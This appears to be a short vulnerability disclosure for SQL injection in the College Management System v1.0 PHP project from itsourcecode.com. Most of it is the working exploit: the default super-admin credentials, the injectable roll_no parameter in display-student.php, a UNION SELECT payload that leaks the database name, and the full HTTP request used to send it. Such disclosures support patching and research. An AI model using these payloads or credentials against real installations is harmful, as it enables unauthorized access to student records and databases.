# College Management System v1.0 by itsourcecode.com has SQL injection

Login account: admin@gmail.com/admin123* (Super Admin account)

vendors: https://itsourcecode.com/free-projects/php-project/college-management-system-project-in-php-and-mysql/

Vulnerability File: /College/admin/display-student.php

Vulnerability location: /College/admin/display-student.php?roll_no=,roll_no=

[+] Payload: /College/admin/display-student.php?roll_no=-1%27%20%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+ // Leak place ---> roll_no=

Current database name: college

```sql
GET /College/admin/display-student.php?roll_no=-1%27%20%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1; ci_session=9cjop1qgnjcd780kijmjrva559enogjl
Connection: close
```

![image](https://user-images.githubusercontent.com/79501212/171632110-5614ba47-999b-4668-a84e-d00e1a8bec0c.png)

![image](https://user-images.githubusercontent.com/79501212/171632137-19cbe9b2-d104-49b6-8145-da4c20604667.png)
